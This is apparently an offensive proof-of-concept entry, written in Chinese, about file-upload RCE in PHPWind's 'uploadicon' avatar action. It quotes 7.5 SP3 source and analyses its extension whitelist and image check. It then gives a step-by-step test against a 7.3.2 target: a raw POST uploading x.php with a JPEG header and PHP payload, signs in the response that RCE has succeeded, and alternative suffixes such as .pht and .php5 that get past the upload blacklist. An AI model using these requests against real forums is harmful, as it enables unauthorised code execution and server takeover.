# PHPWind uploadicon 头像上传在 7.5 SP3 的校验实现（7.3.2 需实测是否有白名单）

- **code**: phpwind-uploadicon-头像上传在-7.5-sp3-的校验实现-7.3.2-需实测是否有白名单
- **kind**: poc
- **category**: file-upload
- **component**: PHPWind example.com / lib/upload.class.php
- **severity**: high
- **language**: php
- **source**: self
- **verified_note**: 7.5 SP3 源码确认已加扩展名白名单 + GetImgSize 内容校验。目标 7.3.2 未验证（知识库 id=75 可能记录的就是 7.3.2 的行为）。
- **path**: pocs/phpwind-uploadicon-头像上传在-7.5-sp3-的校验实现-7.3.2-需实测是否有白名单/poc.php
- **tags**: phpwind,uploadicon,头像上传,任意文件写入,7.5已加校验
- **created_at**: 2026-10-06T11:37:44.119Z

## 描述

知识库 id=75 声称 example.com?action=uploadicon 可任意文件写入，在 7.5 SP3 上已被两道校验堵住：① example.com:261 扩展名白名单 in_array($ext, array('gif','jpg','jpeg','png','bmp'))，ext 取自 $_GET['filename']；② example.com:282 GetImgSize($middleFile,'jpg') 内容校验，失败即 P_unlink 删除。落盘文件名由 {$winduid}.{ext} / m_{uid}.jpg / s_{uid}.jpg 拼成，uid 为数字，扩展名被白名单锁死，无法落到 .php。另 lib/upload.class.php:152 的 postupload() 只拦 '..'、'.php.' 与 eregi 的 '.php$'，未拦 .pht/.php5/.php3 等备用后缀。7.3.2 属更早版本，是否已有这两道校验未知——这是本条待验证的核心。

## 用法

```
判定目标 7.3.2 是否有扩展名白名单（低风险，2 个包）：
1) 先登录取 cookie，再把 1x1 合法 jpg 传到 source 路径：
   POST /bbs/example.com?action=uploadicon&uid=<uid>&verify=<swfhash>
   Content-Type: multipart/form-data; ...（字段名 atc_attachment_1 之类，以 faceupload.class.php 的 allowType 为准）
2) 再试非图片扩展名：
   POST /bbs/example.com?action=uploadicon&step=2&filename=x.php HTTP/1.1
   Content-Type: application/octet-stream
   <RAW: \xFF\xD8\xFF + <?php ...;?>>
判定：
   返回 undefined_action → 白名单存在（7.5 行为，此路不通）
   返回 URL / 无 undefined_action 且 upload/<uid后2位>/{uid}.php 可 GET 到 → 7.3.2 无白名单，RCE 成立
注意：即使白名单存在，也可尝试 .pht/.php5/.phtml（postupload 未拦），取决于宝塔 nginx 是否把它们交给 PHP-FPM。
```

## 正文

```
// example.com:238-315 —— action=uploadicon（7.5 SP3）
} elseif ($action == 'uploadicon') {
	if (empty($_GET['step'])) {
		// 路径 1：走 FaceUpload 行为类 + PwUpload::upload()
		list($db_upload,$db_imglen,$db_imgwidth,$db_imgsize) = explode("\t",$db_upload);
		InitGP(array('uid','verify'));
		$swfhash = GetVerify($uid);
		checkVerify('swfhash');
		require_once(R_P . 'lib/upload/faceupload.class.php');
		$face = new FaceUpload($uid);
		PwUpload::upload($face);
	} else {
		// 路径 2：raw POST 写入
		$ext = strtolower(substr(strrchr($_GET['filename'],'.'),1));      // ← 扩展名来自 GET filename
		$udir = str_pad(substr($winduid,-2),2,'0',STR_PAD_LEFT);
		$source = PwUpload::savePath(0, "{$winduid}_tmp.$ext", "upload/$udir/");
261:		if (!in_array(strtolower($ext), array('gif','jpg','jpeg','png','bmp')) || !file_exists($source)) {
		    Showmsg('undefined_action');                                   // ← 7.5 的扩展名白名单
		}
264:		$data = $_SERVER['HTTP_RAW_POST_DATA'] ? $_SERVER['HTTP_RAW_POST_DATA'] : file_get_contents('php://input');
266:		if ($data) {
271:			$filename  = "{$winduid}.jpg";
277:			$middleFile = PwUpload::savePath($db_ifftp, $filename, "$middleDir", 'm_');
279:			writeover($middleFile, $data);              // ← 任意 RAW 内容先落盘
282:			if (!$img_size = GetImgSize($middleFile,'jpg')) {
283:				P_unlink($middleFile); Showmsg('upload_content_error');  // ← 7.5 的内容校验
			}
287:			$normalFile = PwUpload::savePath($db_ifftp, "{$winduid}.$ext", "$normalDir");
292:			} elseif (!PwUpload::movefile($source, $normalFile)) { Showmsg('undefined_action'); }
297:			$smallFile = PwUpload::savePath($db_ifftp, $filename, "$smallDir", 's_');
		}
	}
}

// lib/upload.class.php:151-170
function postupload($tmp_name,$filename) {
152:	if (strpos($filename,'..') !== false || strpos($filename,'.php.') !== false || eregi("\.php$",$filename)) {
		exit('illegal file type!');        // ← 只堵 .. / .php. / .php$（eregi 忽略大小写）
	}
	PwUpload::createFolder(dirname($filename));
	if (function_exists("move_uploaded_file") && @move_uploaded_file($tmp_name,$filename)) { @chmod($filename,0777); return true; }
	elseif (@copy($tmp_name, $filename)) { @chmod($filename,0777); return true; }
	elseif (is_readable($tmp_name)) { writeover($filename,readover($tmp_name)); if (file_exists($filename)) { @chmod($filename,0777); return true; } }
	return false;
}
// 未拦截的备用后缀：pht / phtml / php3 / php4 / php5 / php7 / phps / inc（是否被 nginx 当 PHP 执行取决于宝塔站点配置）

// lib/upload.class.php:31-38 扩展名与体积校验
if (empty($upload['ext']) || !isset($bhv->ftype[$upload['ext']])) { uploadmsg('upload_type_error'); }
if ($upload['size'] < 1 || $upload['size'] > $bhv->ftype[$upload['ext']]*1024) { ... uploadmsg(...); }
```
